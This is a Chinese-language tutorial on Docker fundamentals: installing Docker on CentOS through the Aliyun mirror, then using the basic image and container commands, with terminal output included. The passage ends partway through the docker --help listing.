镜像(image)：docker镜像好比一个模板，可以通过这个模板来创建容器(container)，一个镜像可以创建多个容器，类似Python中的Class\n\n 2. 容器(container)：类似Python中通过Class创建的实例，Object；容器可以理解为一个简易的系统\n\n 3. 仓库(repository)：存放镜像的地方，\n    \n    分为共有仓库和私有仓库\n    \n    * Docker Hub：国外的\n    \n    * 阿里云：配置镜像加速\n\n\n# 环境准备\n\n我们要有一台服务器，并且可以操作它\n\n 1. Linux命令基础，购买linux阿里云的服务器\n 2. CentOS 7\n 3. 使用Xbash链接远程服务器\n\n\n# 安装xbash\n\n下载CentOS7 https://www.jianshu.com/p/a63f47e096e8\n\n下载VMware 360软件管家下载\n\nVMware配置虚拟机 https://blog.csdn.net/babyxue/article/details/80970526\n\nxbash链接服务器 https://blog.csdn.net/zzy1078689276/article/details/77280814\n\n[root@192 ~]# cd /\n[root@192 /]# pwd\n/\n[root@192 /]# ls\nbin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\n[root@192 /]# uname -r\n3.10.0-1127.el7.x86_64\n\n\n\n\n用户名\n\n密码\n\n查看ip：vmware里面输入，ip addIPr\n\n\n# Centos安装\n\nhttps://docs.docker.com/engine/install/centos/\n\n\n# 卸载旧的版本\n\n# 卸载旧的版本\n$ sudo yum remove docker \\\n                  docker-client \\\n                  docker-client-latest \\\n                  docker-common \\\n                  docker-latest \\\n                  docker-latest-logrotate \\\n                  docker-logrotate \\\n                  docker-engine\n\n\n\n\n\n\n# 安装基本环境\n\n# 安装基本的安装包\n$ sudo yum install -y yum-utils\n\n\n!\n\n\n\n\n# 设置镜像的仓库\n\n注意！！下载默认用国外的，太慢不要用！\n\n用国内镜像，百度搜索，docker的阿里云镜像地址\n\n# 不要用官网默认这个！\n$ sudo yum-config-manager \\\n    --add-repo \\\n    https://download.docker.com/linux/centos/docker-ce.repo # 默认是国外的\n\n# 换成下面的\n\n$ sudo yum-config-manager \\\n    --add-repo \\\n    https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # 阿里云镜像\n\n\n\n\n直接复制粘贴就OK了\n\n更像软件包索引\n\nyum makecache fast\n\n\n\n\n没有问题的话就是可以用的\n\n\n# 安装docker引擎\n\nyum install docker-ce docker-ce-cli containerd.io # docker-ce 社区版 ee 企业版\n\n\n注意这里会有几个个y/n的判断\n\n\n\n\n\n要看到Complet再收手！\n\n\n# 启动Docker\n\nsystemctl start docker # 代表启动成功\n\n\ndocker version\n\n\nClient: Docker Engine - Community\n Version:           19.03.11\n API version:       1.40\n Go version:        go1.13.10\n Git commit:        42e35e61f3\n Built:             Mon Jun  1 09:13:48 2020\n OS/Arch:           linux/amd64\n Experimental:      false\n\nServer: Docker Engine - Community\n Engine:\n  Version:          19.03.11\n  API version:      1.40 (minimum version 1.12)\n  Go version:       go1.13.10\n  Git commit:       42e35e61f3\n  Built:            Mon Jun  1 09:12:26 2020\n  OS/Arch:          linux/amd64\n  Experimental:     false\n containerd:\n  Version:          1.2.13\n  GitCommit:        7ad184331fa3e55e52b890ea95e65ba581ae3429\n runc:\n  Version:          1.0.0-rc10\n  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd\n docker-init:\n  Version:          0.18.0\n  GitCommit:        fec3683\n\n\n\ndocker run hello-world\n\n\n\n\n中间一堆是签名信息\n\nrun的运行流程图\n\n\n\n查看下载的镜像\n\ndocker images\n\n\n\n\n\n# 卸载Docker\n\n# 卸载依赖\nyum remove docker-ce docker-ce-cli containerd.io\n\n# 删除资源\nrm -rf /var/lib/docker # docker 的默认工作路径\n\n\n\n\n# 阿里云镜像加速\n\n支付宝扫码登录，短信验证，确认授权\n\n我有两个问题\n\n 1. 阿里云镜像加速必须配置嘛？\n    \n    > 哎呦我去: 加速快\n    > \n    > 哎呦我去: 要是翻墙就无所谓了\n\n 2. 这个阿里云必须要买嘛，买哪个，我看阿里云好多产品\n    \n    > 哎呦我去:不需要买\n    > \n    > 哎呦我去:免费的\n    > \n    > 哎呦我去:阿里云搜索容器服务\n    > \n    > 哎呦我去:有一个镜像加速\n\n 3. 这个地址是哪来的呀\n\n操作\n\n\n\n\n\n控制台搜索 容器镜像服务\n\n\n\n找到加速地址\n\n\n\nsudo mkdir -p /etc/docker # 创建一个陌路\nsudo tee /etc/docker/daemon.json <<-\'EOF\'\n{\n  "registry-mirrors": ["https://uyfgafsw.mirror.aliyuncs.com"]\n}\nEOF # 编写配置文件\n\nsudo systemctl daemon-reload # 重启服务\nsudo systemctl restart docker # 重启docker\n\n\n\n\n在线画图软件ProcessOn\n\n服务器及购买相关介绍\n\n\n# 底层原理\n\nDocker是真么工作的？\n\nDocker是一个Client-Server结构的系统，Docker的守护进程在主机上。通过Socket从客户端访问！\n\nDockerServer接受到Docker-Client的指令，\n\n\n\nDocker为什么比VM快？\n\n 1. Docker有着比虚拟机更少的抽象层\n 2. docker主要用的是宿主机的内核，vm需要Guest OS\n\n\n\n所以说新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导\n\n\n# Docker命令\n\n\n# 帮助命令\n\ndocker version # 显示docker的基本信息\ndocker info # 系统信息，镜像和容器的数量\ndocker 命令 --help # 全部信息\n\n\n官网文档\n\n\n\n\n# 镜像命令\n\n# docker images\n\n查看所有本地主机上的镜像\n\n[root@192 ~]# docker images\n\n\n\n\n\n# 解释\nREPOSITORY  # 镜像仓库源\nTAG                 # 镜像的标签\nIMAGE ID           # 镜像的ID\nCREATED           # 镜像的创建时间\nSIZE # 镜像的大小\n\n\n--all , -a\t\tShow all images (default hides intermediate images) # 显示所有\n--digests\t\tShow digests\n--filter , -f\t\tFilter output based on conditions provided\n--format\t\tPretty-print images using a Go template\n--no-trunc\t\tDon’t truncate output\n--quiet , -q\t\tOnly show numeric IDs # 只显示id\n\n\n\n\n# docker search\n\n搜索仓库中的镜像，相当于网页搜索\n\n网页搜索\n\n\n\nmysql\n\n\n\ndocker search mysql\n\n\n\n\ndocker search --help\n\n\n\n\n# 解释\nOptions:\n  -f, --filter filter   Filter output based on conditions provided\n      --format string   Pretty-print search using a Go template\n      --limit int       Max number of search results (default 25)\n      --no-trunc        Don\'t truncate output\n\n\n\ndocker search mysql --filter=STARS=3000 # 搜索出Stars大于3000的\n\n\n\n\n# docker pull\n\n下载镜像\n\ndocker pull mysql # 下载mysql镜像，default tag，默认最新版latest\n\n\n[root@192 ~]# sudo systemctl daemon-reload\n[root@192 ~]# sudo systemctl restart docker\n[root@192 ~]# docker pull mysql\nUsing default tag: latest # 不写tag默认最新版\nlatest: Pulling from library/mysql\n8559a31e96f4: Pull complete  # layer 分层下载，docker image的核心 联合文件系统\nd51ce1c2e575: Pull complete \nc2344adc4858: Pull complete \nfcf3ceff18fc: Pull complete \n16da0c38dc5b: Pull complete \nb905d1797e97: Pull complete \n4b50d1c6b05c: Pull complete \nc75914a65ca2: Pull complete \n1ae8042bdd09: Pull complete \n453ac13c00a3: Pull complete \n9e680cd72f08: Pull complete \na6b5dc864b6c: Pull complete \nDigest: sha256:8b7b328a7ff6de46ef96bcf83af048cb00a1c86282bfca0cb119c84568b4caf6#签名\nStatus: Downloaded newer image for mysql:latest\ndocker.io/library/mysql:latest # 真实地址\n\n# 即\ndocker pull mysql\n# 等价于\ndocker pull docker.io/library/mysql:latest\n\n\n\n\n# 指定版本下载 \ndocker pull mysql:5.7\n\n\n版本来自于官网，版本库https://hub.docker.com/_/mysql\n\n\n\n\n\ndocker images\n\n\n此时查看镜像，可以看到新下载的两个\n\n\n\n# docker rmi\n\nremove images\n\n# 删除一个 可以通过名称 也可以指定id -f表示删除所有\ndocker rmi -f 9cfcce23593a\n# 删除多个 用空格分隔id\ndocker rmi -f id id id\n# 删除所有 \ndocker rmi -f $(docker images -aq) # images -aq就是查所有镜像id，从而递归删除\n\n\n\n\n\n\n\n# 容器命令\n\n说明：有了镜像才能创建容器，linux，下载一个centos镜像来测试学习\n\ndocker pull centos\n\n\n\n\n# 新建容器并启动\n\ndocker run [可选参数] image\n\n# 参数说明\n--name=“Name” # 容器名字，用于区分容器\n-d 后台方式运行\n-it 使用交互方式运行，进入容器查看内容\n-p 指定容器的端口 如-p 8080::8080\n\t-p ip:主机端口：容器端口\n\t-p 主机端口:容器端口\n\t-p 容器端口\n\t\n-p 随机指定端口\n\n\n# 进入退出容器\n\n# 进入\ndocker run -it centos /bin/bash \n# 查看目录\nls\n# 退出\nexit\n\n\n\n\n注意这里面主机名，编程了centos的id\n\n这里面就是一个容器，套娃啊\n\n# 查看运行的容器\n\n# 查看正在运行的容器\ndocker ps\n# 查看曾经运行的容器\ndocker ps -a\n# 显示最近创建的容器，设置显示个数\ndocker ps -a - n=? \n# 只显示容器的编号\ndocker ps -aq\n\n\n[root@192 ~]# docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\n[root@192 ~]# docker ps -a\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES\n9939864fa2e6        centos              "bin/bash"          4 minutes ago       Exited (0) 4 minutes ago                       unruffled_knuth\n5f42e9930435        centos              "/bin/bash"         8 minutes ago       Exited (0) 4 minutes ago                       lucid_cannon\na89ddb393d3d        bf756fb1ae65        "/hello"            19 hours ago        Exited (0) 19 hours ago                        gracious_bhabha\n[root@192 ~]# docker ps -a -n=2\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES\n9939864fa2e6        centos              "bin/bash"          6 minutes ago       Exited (0) 6 minutes ago                       unruffled_knuth\n5f42e9930435        centos              "/bin/bash"         10 minutes ago      Exited (0) 7 minutes ago \n[root@192 ~]# docker ps -aq\n9939864fa2e6\n5f42e9930435\na89ddb393d3d\n\n\n\n# 退出容器\n\n# 容器停止退出\nexit\n# 容器不停止退出 注意必须在英文输入法下，中文输入法不行\nCtrl + P + Q\n\n\n[root@192 ~]# docker run -it centos /bin/bash\n[root@bfcea13c40cd /]# [root@192 ~]# docker ps ##注意这里会自动给个命令，删掉\nCONTAINER ID        IMAGE               COMMAND             CREATED              STATUS              PORTS               NAMES\nbfcea13c40cd        centos              "/bin/bash"         About a minute ago   Up About a minute                       stoic_wilson\nedbd9366d959        centos              "/bin/bash"         7 minutes ago        Up 7 minutes                            affectionate_bartik\n[root@192 ~]# docker exec -it edbd9366d959 /bin/bash ## 再次进入\n[root@edbd9366d959 /]# exit ##停止并推出\nexit\n\n\n\n# 删除容器\n\n# 删除指定容器 不能删除正在运行的容器，如果强制删除 rm -f\ndocker rm 容器id\n# 删除所有容器\ndocker rm -f $(docker ps -aq)\n# 删除所有容器\ndocker ps -a -q|xargs docker rm\n\n\n[root@192 ~]# docker ps -a\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES\nbfcea13c40cd        centos              "/bin/bash"         29 minutes ago      Up 29 minutes                                   stoic_wilson\nedbd9366d959        centos              "/bin/bash"         35 minutes ago      Up 35 minutes                                   affectionate_bartik\n9939864fa2e6        centos              "bin/bash"          48 minutes ago      Exited (0) 48 minutes ago                       unruffled_knuth\n5f42e9930435        centos              "/bin/bash"         52 minutes ago      Exited (0) 49 minutes ago                       lucid_cannon\na89ddb393d3d        bf756fb1ae65        "/hello"            20 hours ago        Exited (0) 20 hours ago                         gracious_bhabha\n[root@192 ~]# docker rm 5f42e9930435\n5f42e9930435\n[root@192 ~]# docker rm edbd9366d959      # 注意正在运行的容器不能删除\nError response from daemon: You cannot remove a running container edbd9366d9596c744dd449119269b04de2f2a494e7fc471f6396bcefd94c33fe. Stop the container before attempting removal or force remove\n\n\n\n[root@192 ~]# docker ps -aq # 所有容器id\nbfcea13c40cd\nedbd9366d959\n9939864fa2e6\na89ddb393d3d\n[root@192 ~]# docker rm -f $(docker ps -aq) # 全部删除\nbfcea13c40cd\nedbd9366d959\n9939864fa2e6\na89ddb393d3d\n\n\n\n# 启动和停止容器的操作\n\ndocker start\ndocker restart\ndocker stop\ndocker kill\n\n\n[root@192 ~]# docker run -it centos /bin/bash\n[root@7b1a7dd10ea4 /]# exit\nexit\n[root@192 ~]# docker ps #查看正在运行的\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\n[root@192 ~]# docker ps -a # 查看历史运行过的\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES\n7b1a7dd10ea4        centos              "/bin/bash"         54 seconds ago      Exited (0) 42 seconds ago                       fervent_mirzakhani\n[root@192 ~]# docker start 7b1a7dd10ea4 # 启动当前这个容器 container id 粘过 来\n7b1a7dd10ea4\n[root@192 ~]# docker ps # 查看当前运行容器 发现启动成功\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\n7b1a7dd10ea4        centos              "/bin/bash"         2 minutes ago       Up 28 seconds                           fervent_mirzakhani\n[root@192 ~]# docker stop 7b1a7dd10ea4 # 停止运行\n7b1a7dd10ea4\n[root@192 ~]# docker ps # 再次查看 没有这个容器了\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\n\n\n\n\n\n# 常用其他命令\n\n# 后台启动docker\n\ndocker run -d 镜像名\n# 用docker ps 查看的时候 发现停止了\n\n# 后台运行，docker发现前台没有，容器启动后，发现自己没有提供服务，会立刻停止\n\n\nLast login: Wed Jun 17 19:47:35 2020\n[root@192 ~]# systemctl start docker # 关机后重启了，需要启动docker\n[root@192 ~]# docker run -d centos # 运行\n8ce188e5fee31c2fac93c0a405ee1a95c38dbc50cb47c35b19c0039c27558ded\n[root@192 ~]# docker ps -a # 查看正在运行的\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES\n8ce188e5fee3        centos              "/bin/bash"         19 seconds ago      Exited (0) 18 seconds ago                       tender_dirac\n7b1a7dd10ea4        centos              "/bin/bash"         8 hours ago         Exited (0) 8 hours ago                          fervent_mirzakhani\n\n\n\n# 查看日志\n\ndocker logs\ndocker logs -f -t --tail n 【id】\n\n\n\n\n\n[root@192 ~]# docker logs --help\n\nUsage:\tdocker logs [OPTIONS] CONTAINER\n\nFetch the logs of a container\n\nOptions:\n      --details        Show extra details provided to logs\n  -f, --follow         Follow log output\n      --since string   Show logs since timestamp (e.g.\n                       2013-01-02T13:23:37) or relative\n                       (e.g. 42m for 42 minutes)\n      --tail string    Number of lines to show from the\n                       end of the logs (default "all")\n  -t, --timestamps     Show timestamps # 时间戳\n      --until string   Show logs before a timestamp (e.g.\n                       2013-01-02T13:23:37) or relative\n                       (e.g. 42m for 42 minutes)\n\n\n\nwhiel true;do echo shenzai;sleep \n\n\n# 运行一个\n[root@192 ~]# docker run -it centos /bin/bash\n\n[root@c2887d35c71d /]# [root@192 ~]# docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\nc2887d35c71d        centos              "/bin/bash"         57 seconds ago      Up 56 seconds                           vigorous_kare\n\n# 查看日志，由于没有运行脚本，所以啥也没显示\n[root@192 ~]# docker logs -f -t --tail 10 c2887d35c71d\n^C # ctrl+c退出\n\n# 运行centos里面加个脚本\n[root@192 ~]# docker run -d centos /bin/sh -c "while true;do echo shenzai;sleep 1;done"\ncb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388\n\n[root@192 ~]# docker ps\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES\ncb6d7fbc3f27        centos              "/bin/sh -c \'while t…"   7 seconds ago       Up 6 seconds                            dreamy_almeida\nc2887d35c71d        centos              "/bin/bash"              3 minutes ago       Up 3 minutes                            vigorous_kare\n\n# 查看日志 发现隔一秒打印一条\n[root@192 ~]# docker logs -f -t --tail 10 cb6d7fbc3f27\n2020-06-17T12:02:11.293765084Z shenzai\n2020-06-17T12:02:12.297675608Z shenzai\n2020-06-17T12:02:13.301845582Z shenzai\n2020-06-17T12:02:14.304800996Z shenzai\n2020-06-17T12:02:15.307130238Z shenzai\n2020-06-17T12:02:16.310574235Z shenzai\n2020-06-17T12:02:17.312946923Z shenzai\n2020-06-17T12:02:18.314841295Z shenzai\n2020-06-17T12:02:19.317021705Z shenzai\n2020-06-17T12:02:20.319670013Z shenzai\n2020-06-17T12:02:21.322651649Z shenzai\n2020-06-17T12:02:22.325466918Z shenzai\n2020-06-17T12:02:23.327984704Z shenzai\n2020-06-17T12:02:24.329656919Z shenzai\n\n\n\n# 查看正在运行的容器信息\n\n[root@192 ~]# docker inspect cb6d7fbc3f27\n[\n    {\n        # 容器的完整id\n        "Id": "cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388",\n        \n        # 创建时间\n        "Created": "2020-06-17T12:00:50.706906186Z",\n        \n        # 脚本位置\n        "Path": "/bin/sh",\n        \n        # 运行的脚本\n        "Args": [\n            "-c",\n            "while true;do echo shenzai;sleep 1;done"\n        ],\n        "State": {\n            "Status": "running", # 状态，正在运行\n            "Running": true,\n            "Paused": false,\n            "Restarting": false,\n            "OOMKilled": false,\n            "Dead": false,\n            "Pid": 1909, # 父进程id\n            "ExitCode": 0,\n            "Error": "",\n            "StartedAt": "2020-06-17T12:00:51.093617477Z",\n            "FinishedAt": "0001-01-01T00:00:00Z"\n        },\n        \n        # 来源镜像\n        "Image": "sha256:831691599b88ad6cc2a4abbd0e89661a121aff14cfa289ad840fd3946f274f1f",\n        "ResolvConfPath": "/var/lib/docker/containers/cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388/resolv.conf",\n        "HostnamePath": "/var/lib/docker/containers/cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388/hostname",\n        "HostsPath": "/var/lib/docker/containers/cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388/hosts",\n        "LogPath": "/var/lib/docker/containers/cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388/cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388-json.log",\n        \n        \n        "Name": "/dreamy_almeida",\n        "RestartCount": 0,\n        "Driver": "overlay2",\n        "Platform": "linux",\n        "MountLabel": "",\n        "ProcessLabel": "",\n        "AppArmorProfile": "",\n        "ExecIDs": null,\n        \n        # 主机配置\n        "HostConfig": {\n            "Binds": null,\n            "ContainerIDFile": "",\n            "LogConfig": {\n                "Type": "json-file",\n                "Config": {}\n            },\n            "NetworkMode": "default",\n            "PortBindings": {},\n            "RestartPolicy": {\n                "Name": "no",\n                "MaximumRetryCount": 0\n            },\n            "AutoRemove": false,\n            "VolumeDriver": "",\n            "VolumesFrom": null,\n            "CapAdd": null,\n            "CapDrop": null,\n            "Capabilities": null,\n            "Dns": [],\n            "DnsOptions": [],\n            "DnsSearch": [],\n            "ExtraHosts": null,\n            "GroupAdd": null,\n            "IpcMode": "private",\n            "Cgroup": "",\n            "Links": null,\n            "OomScoreAdj": 0,\n            "PidMode": "",\n            "Privileged": false,\n            "PublishAllPorts": false,\n            "ReadonlyRootfs": false,\n            "SecurityOpt": null,\n            "UTSMode": "",\n            "UsernsMode": "",\n            "ShmSize": 67108864,\n            "Runtime": "runc",\n            "ConsoleSize": [\n                0,\n                0\n            ],\n            "Isolation": "",\n            "CpuShares": 0,\n            "Memory": 0,\n            "NanoCpus": 0,\n            "CgroupParent": "",\n            "BlkioWeight": 0,\n            "BlkioWeightDevice": [],\n            "BlkioDeviceReadBps": null,\n            "BlkioDeviceWriteBps": null,\n            "BlkioDeviceReadIOps": null,\n            "BlkioDeviceWriteIOps": null,\n            "CpuPeriod": 0,\n            "CpuQuota": 0,\n            "CpuRealtimePeriod": 0,\n            "CpuRealtimeRuntime": 0,\n            "CpusetCpus": "",\n            "CpusetMems": "",\n            "Devices": [],\n            "DeviceCgroupRules": null,\n            "DeviceRequests": null,\n            "KernelMemory": 0,\n            "KernelMemoryTCP": 0,\n            "MemoryReservation": 0,\n            "MemorySwap": 0,\n            "MemorySwappiness": null,\n            "OomKillDisable": false,\n            "PidsLimit": null,\n            "Ulimits": null,\n            "CpuCount": 0,\n            "CpuPercent": 0,\n            "IOMaximumIOps": 0,\n            "IOMaximumBandwidth": 0,\n            "MaskedPaths": [\n                "/proc/asound",\n                "/proc/acpi",\n                "/proc/kcore",\n                "/proc/keys",\n                "/proc/latency_stats",\n                "/proc/timer_list",\n                "/proc/timer_stats",\n                "/proc/sched_debug",\n                "/proc/scsi",\n                "/sys/firmware"\n            ],\n            "ReadonlyPaths": [\n                "/proc/bus",\n                "/proc/fs",\n                "/proc/irq",\n                "/proc/sys",\n                "/proc/sysrq-trigger"\n            ]\n        },\n        \n        # 其他配置\n        "GraphDriver": {\n            "Data": {\n                "LowerDir": "/var/lib/docker/overlay2/3675586ebbd79cd72d2562a90c9380627a331c563724c0dac091f92600af4907-init/diff:/var/lib/docker/overlay2/7f79322e0f58d651a84a555dadd83d92537788172525945d3f538dd95dce336c/diff",\n                "MergedDir": "/var/lib/docker/overlay2/3675586ebbd79cd72d2562a90c9380627a331c563724c0dac091f92600af4907/merged",\n                "UpperDir": "/var/lib/docker/overlay2/3675586ebbd79cd72d2562a90c9380627a331c563724c0dac091f92600af4907/diff",\n                "WorkDir": "/var/lib/docker/overlay2/3675586ebbd79cd72d2562a90c9380627a331c563724c0dac091f92600af4907/work"\n            },\n            "Name": "overlay2"\n        },\n        \n        "Mounts": [], # 挂载\n        \n        # 基本配置\n        "Config": {\n            "Hostname": "cb6d7fbc3f27",\n            "Domainname": "",\n            "User": "",\n            "AttachStdin": false,\n            "AttachStdout": false,\n            "AttachStderr": false,\n            "Tty": false,\n            "OpenStdin": false,\n            "StdinOnce": false,\n            "Env": [\n                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\n            ], # 基本环境变量，这里没有Java\n            \n            # 基本命令\n            "Cmd": [\n                "/bin/sh",\n                "-c",\n                "while true;do echo shenzai;sleep 1;done"\n            ],\n            "Image": "centos",\n            "Volumes": null,\n            "WorkingDir": "",\n            "Entrypoint": null,\n            "OnBuild": null,\n            "Labels": {\n                "org.label-schema.build-date": "20200611",\n                "org.label-schema.license": "GPLv2",\n                "org.label-schema.name": "CentOS Base Image",\n                "org.label-schema.schema-version": "1.0",\n                "org.label-schema.vendor": "CentOS"\n            }\n        },\n        \n        # 网卡，比如现在用的是桥接的网卡\n        "NetworkSettings": {\n            "Bridge": "",\n            "SandboxID": "4d701985d7e77aa153790b697b2f38a61e20555c224b7675e4bf650b82799882",\n            "HairpinMode": false,\n            "LinkLocalIPv6Address": "",\n            "LinkLocalIPv6PrefixLen": 0,\n            "Ports": {},\n            "SandboxKey": "/var/run/docker/netns/4d701985d7e7",\n            "SecondaryIPAddresses": null,\n            "SecondaryIPv6Addresses": null,\n            "EndpointID": "8a6c71e2bafb19ca7dfd85445ccc4bef6d17467360a243d624089e676a24a018",\n            "Gateway": "172.17.0.1",\n            "GlobalIPv6Address": "",\n            "GlobalIPv6PrefixLen": 0,\n            "IPAddress": "172.17.0.3",\n            "IPPrefixLen": 16,\n            "IPv6Gateway": "",\n            "MacAddress": "02:42:ac:11:00:03",\n            "Networks": {\n                "bridge": {\n                    "IPAMConfig": null,\n                    "Links": null,\n                    "Aliases": null,\n                    "NetworkID": "22b0fd2290ccbc4e066a75d3f01bd8bf32ee4352c5bbcfc9f911287219219571",\n                    "EndpointID": "8a6c71e2bafb19ca7dfd85445ccc4bef6d17467360a243d624089e676a24a018",\n                    "Gateway": "172.17.0.1",\n                    "IPAddress": "172.17.0.3",\n                    "IPPrefixLen": 16,\n                    "IPv6Gateway": "",\n                    "GlobalIPv6Address": "",\n                    "GlobalIPv6PrefixLen": 0,\n                    "MacAddress": "02:42:ac:11:00:03",\n                    "DriverOpts": null\n                }\n            }\n        }\n    }\n]\n\n\n\n# 停止正在疯狂输出的那个容器\n[root@192 ~]# docker stop cb6d7fbc3f27\ncb6d7fbc3f27\n\n\n# 进入当前正在运行的容器\n\n# 我们通常容器都是使用后台方式运行的e\n\ndocker exec -it 容器id bashbash\n\n# 测试\n[root@192 ~]# docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\nc2887d35c71d        centos              "/bin/bash"         35 minutes ago      Up 35 minutes                           vigorous_kare\n[root@192 ~]# docker exec -it c2887d35c71d /bin/bash\n[root@c2887d35c71d /]# ls\nbin  etc   lib\t  lost+found  mnt  proc  run   srv  tmp  var\ndev  home  lib64  media       opt  root  sbin  sys  usr\n[root@c2887d35c71d /]# ps -ef\nUID         PID   PPID  C STIME TTY          TIME CMD\nroot          1      0  0 11:57 pts/0    00:00:00 /bin/bash\nroot         14      0  0 12:32 pts/1    00:00:00 /bin/bash\nroot         28     14  0 12:32 pts/1    00:00:00 ps -ef\n[root@c2887d35c71d /]# c2887d35c71d\n[root@c2887d35c71d /]# exit\nexit\n\n# 方式二\n[root@192 ~]# docker attach c2887d35c71d\n[root@c2887d35c71d /]# \n\n# 区别\n# docker exec # 进入容器后开启一个新的终端，可以在里面操作(常用)\n# docker attach 进入容器正在执行的终端，不会启动新的进程\n\n\n\n# 从容器内拷贝文件到主机上\n\n# 运行\n[root@192 ~]# docker run -it centos\n# ctrl P Q 不关闭退出，查看\n[root@0569081aa89c /]# [root@192 ~]# docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\n0569081aa89c        centos              "/bin/bash"         19 seconds ago      Up 19 seconds    \nhopeful_chebyshev\n\n# 查看主机home下无文件\n[root@192 ~]# cd /home\n[root@192 home]# ls\n\n# 进入正在运行的容器\n[root@192 home]# docker attach 0569081aa89c\n\n# 进入容器home目录\n[root@0569081aa89c /]# cd /home\n\n# 在目录中创建java文件\n[root@0569081aa89c home]# touch test.java\n\n# 退出并停止容器\n[root@0569081aa89c home]# exit\nexit\n\n# 查看现在运行的容器\n[root@192 home]# docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\n\n# 容器虽然被停止，但是数据都会保留\n[root@192 home]# docker ps -a\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                         PORTS               NAMES\n0569081aa89c        centos              "/bin/bash"              3 minutes ago       Exited (0) 8 seconds ago                           hopeful_chebyshev\nf589e5684a01        centos              "/bin/bash"              44 minutes ago      Exited (0) 44 minutes ago                          cranky_easley\ncb6d7fbc3f27        centos              "/bin/sh -c \'while t…"   54 minutes ago      Exited (137) 42 minutes ago                        dreamy_almeida\nc2887d35c71d        centos              "/bin/bash"              58 minutes ago      Exited (127) 16 minutes ago                        vigorous_kare\n8ce188e5fee3        centos              "/bin/bash"              About an hour ago   Exited (0) About an hour ago                       tender_dirac\n7b1a7dd10ea4        centos              "/bin/bash"              9 hours ago         Exited (0) 9 hours ago                             fervent_mirzakhani\n\n# 容器数据拷贝到主机\n[root@192 home]# docker cp 0569081aa89c:/home/test.java /home\n[root@192 home]# ls\ntest.java\n\n# 拷贝是一个手动过程，未来我们使用 -v 卷的技术，可以实现自动同步 /home /home\n\n\n# 查看内容占用\n\ndocker stats\n\n\n\n# 小结\n\n\n\n[root@192 home]# docker --help\n\nUsage:\tdocker [OPTIONS] COMMAND\n\nA self-sufficient runtime for containers\n\nOptions:\n      --config string      Location of client config\n                           files (default "/root/.docker")\n  -c, --context string     Name of the context to use to\n                           connect to the daemon\n                           (overrides DOCKER_HOST env var\n                           and default context set with\n                           "docker context use")\n  -D, --debug              Enable debug mode\n  -H, --host list          Daemon socket(s) to connect to\n  -l, --log-level string   Set the logging level\n                           ("debug"|"info"|"warn"|"error"|"fatal") (default "info")\n      --tls                Use TLS; implied by --tlsverify\n      --tlscacert string   Trust certs signed only by\n                           this CA (default\n                           "/root/.docker/ca.pem")\n      --tlscert string     Path to TLS certificate file\n                           (default "/root/.docker/cert.pem")\n      --tlskey string      Path to TLS key file (default\n                           "/root/.docker/key.pem")\n      --tlsverify          Use TLS and verify the remote\n  -v, --version            Print version information and quit\n\nManagement Commands:\n  builder     Manage builds\n  config      Manage Docker configs\n  container   Manage containers\n  context     Manage contexts\n  engine      Manage the docker engine\n  image       Manage images\n  network     Manage networks\n  node        Manage Swarm nodes\n  plugin      Manage plugins\n  secret      Manage Docker secrets\n  service     Manage services\n  stack       Manage Docker stacks\n  swarm       Manage Swarm\n  system      Manage Docker\n  trust       Manage trust on Docker images\n  volume      Manage volumes\n\nCommands:\n  attach      Attach local standard input, output, and error streams to a running container\n  build       Build an image from a Dockerfile\n  commit      Create a new image from a container\'s changes\n  cp          Copy files/folders between a container and the local filesystem\n  create      Create a new container\n  diff        Inspect changes to files or directories on a container\'s filesystem\n  events      Get real time events from the server\n  exec        Run a command in a running container\n  export      Export a container\'s filesystem as a tar archive\n  history     Show the history of an image\n  images      List images\n  import      Import the contents from a tarball to create a filesystem image\n  info        Display system-wide information\n  inspect     Return low-level information on Docker objects\n  kill        Kill one or more running containers\n  load        Load an image from a tar archive or STDIN\n  login       Log in to a Docker registry\n  logout      Log out from a Docker registry\n  logs        Fetch the logs of a container\n  pause       Pause all processes within one or more containers\n  port        List port mappings or a specific mapping for the container\n  ps          List containers\n  pull        Pull an image or a repository from a registry\n  push        Push an image or a repository to a registry\n  rename      Rename a container\n  restart     Restart one or more containers\n  rm          Remove one or more containers\n  rmi         Remove one or more images\n  run         Run a command in a new container\n  save        Save one or more images to a tar archive (streamed to STDOUT by default)\n  search      Search the Docker Hub for images\n  start       Start one or more stopped containers\n  stats       Display a live stream of container(s) resource usage statistics\n  stop        Stop one or more running containers\n  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE\n  top         Display the running processes of a container\n  unpause     Unpause all processes within one or more containers\n  update      Update configuration of one or more containers\n  version     Show the Docker version information\n  wait    